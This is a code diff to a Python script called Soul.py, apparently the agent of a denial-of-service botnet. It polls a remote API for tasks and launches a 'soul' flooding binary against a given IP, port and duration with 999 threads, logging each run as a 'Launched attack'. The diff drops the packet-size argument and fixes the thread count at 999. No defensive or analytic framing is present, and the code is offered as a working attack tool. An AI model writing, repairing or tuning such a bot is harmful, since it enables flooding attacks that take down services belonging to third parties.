@@ -22,11 +22,10 @@ def process_new_task(added):
             try:
                 # Check which binary exists
                 if os.path.exists('./soul'):
-                    # Format: ./soul IP port time packet_size threads
-                    # packet_size = 1024, threads = 999
-                    cmd = ['./soul', ip, port, time_val, '1024', '999']
+                    # ALWAYS use 999 threads (4th parameter)
+                    cmd = ['./soul', ip, port, time_val, '999']
                 elif os.path.exists('soul.exe'):
-                    cmd = ['soul.exe', ip, port, time_val, '1024', '999']
+                    cmd = ['soul.exe', ip, port, time_val, '999']
                 else:
                     print(f"[!] ERROR: 'soul' binary not found!")
                     print(f"[!] Current directory: {os.getcwd()}")
@@ -34,7 +33,7 @@ def process_new_task(added):
                 
                 print(f"[+] Executing: {' '.join(cmd)}")
                 process = subprocess.Popen(cmd)
-                print(f"[+] Launched attack with packet_size=1024, threads=999 (PID: {process.pid})")
+                print(f"[+] Launched attack with 999 threads (PID: {process.pid})")
                 
                 active_tasks[key] = {
                     'process': process,
@@ -57,7 +56,7 @@ def process_new_task(added):
 def main_loop():
     print("[*] Soul.py started - Polling API for tasks...")
     print(f"[*] API URL: {BASE_URL}{SOUL_PATH}")
-    print(f"[*] Will use packet_size=1024 and threads=999 for all attacks")
+    print(f"[*] Will always use 999 threads for attacks")
     
     while True:
         try:
